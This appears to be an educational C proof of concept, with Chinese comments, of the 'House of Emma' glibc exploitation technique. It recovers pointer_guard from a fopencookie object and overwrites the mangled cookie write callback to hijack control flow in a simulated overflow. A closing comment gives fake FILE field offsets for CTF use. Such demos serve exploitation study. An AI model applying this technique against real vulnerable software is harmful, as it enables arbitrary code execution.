#define _GNU_SOURCE
/*
 * 手法：通过 `_IO_cookie_jumps` 到达用户可控回调的 House of Emma，适用于 glibc 2.24～2.43，x86-64。
 *
 * 983fd5c 在 2.24 把堆上的 cookie callbacks 改为 PTR_MANGLE：
 *
 *   encoded = rol64(callback ^ pointer_guard, 17)
 *
 * 本 PoC 不读取 fs:0x30，而是从一个真实 fopencookie 对象中读取“已知明文
 * benign_write 对应的密文”，反推出本进程 guard；这对应 CTF 中已知函数
 * 指针 + UAF read 的常见模型。随后模拟 overflow，覆盖 cookie 和 mangled
 * write callback，最终由合法 `_IO_cookie_jumps` 间接调用 emma_callback。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

static void *expected_cookie;
static int callback_count;

/* fopencookie 必须提供一个初始合法 write callback。 */
static ssize_t benign_write(void *cookie, const char *buffer, size_t size)
{
    (void)cookie;
    (void)buffer;
    return (ssize_t)size;
}

static ssize_t emma_callback(void *cookie, const char *buffer, size_t size)
{
    callback_count++;
    assert(cookie == expected_cookie);
    assert(size == 4);
    assert(memcmp(buffer, "EMMA", 4) == 0);
    puts("[+] Emma 2.24+：加密回调命中");
    return (ssize_t)size;
}

int main(void)
{
    setbuf(stdout, NULL);
    assert(sizeof(FILE) == 0xd8);

    cookie_io_functions_t functions;
    memset(&functions, 0, sizeof(functions));
    functions.write = benign_write;

    uint64_t original_cookie = 0x1111111111111111ULL;
    uint64_t controlled_cookie = 0x454d4d415f4e4557ULL;
    FILE *fp = fopencookie(&original_cookie, "w", functions);
    assert(fp != NULL);
    assert(setvbuf(fp, NULL, _IONBF, 0) == 0);

    void **cookie_slot = (void **)((char *)fp + 0xe0);
    uintptr_t *write_slot = (uintptr_t *)((char *)fp + 0xf0);
    uintptr_t encoded_benign = *write_slot;
    assert(encoded_benign != (uintptr_t)benign_write);

    /*
     * 逆变换：ror64(encoded_benign, 17) = benign_write ^ pointer_guard。
     * 直接展开循环右移，避免为了一个公式再跳到辅助函数。
     */
    uintptr_t pointer_guard =
        ((encoded_benign >> 17) | (encoded_benign << 47)) ^
        (uintptr_t)benign_write;

    /*
     * 正向变换：rol64(emma_callback ^ pointer_guard, 17)。
     * 这个编码值就是漏洞最终要写入 cookie write callback 的内容。
     */
    uintptr_t plain_attack = (uintptr_t)emma_callback ^ pointer_guard;
    uintptr_t encoded_attack = (plain_attack << 17) | (plain_attack >> 47);

    expected_cookie = &controlled_cookie;
    *cookie_slot = expected_cookie;
    *write_slot = encoded_attack;                     /* 漏洞模拟。 */

    assert(fwrite("EMMA", 1, 4, fp) == 4);
    assert(callback_count == 1);
    fclose(fp);
    return 0;
}

/*
 * ======================== fake cookie FILE 伪代码 ========================
 *
 * 可执行部分从真实 fopencookie 对象反推出 pointer_guard。题目中构造完整
 * fake `_IO_cookie_file` 时，按下面字段关系写入：
 *
 *     encoded = rol64(callback ^ pointer_guard, 17)；
 *     fake_file[0x88] = 可写且初始为零的锁；
 *     fake_file[0xd8] = _IO_cookie_jumps；
 *     fake_file[0xe0] = cookie；
 *     fake_file[0xe8] = encoded_read；
 *     fake_file[0xf0] = encoded_write；
 *     fake_file[0xf8] = encoded_seek；
 *     fake_file[0x100] = encoded_close；
 *
 * 根据实际触发的 read/write/seek/close 再补 FILE flags 和缓冲区条件。
 * 2.23 回调是明文；2.24 起不知道 fs:0x30 的 pointer_guard，就不能直接
 * 把 system 裸地址写入回调槽。
 */
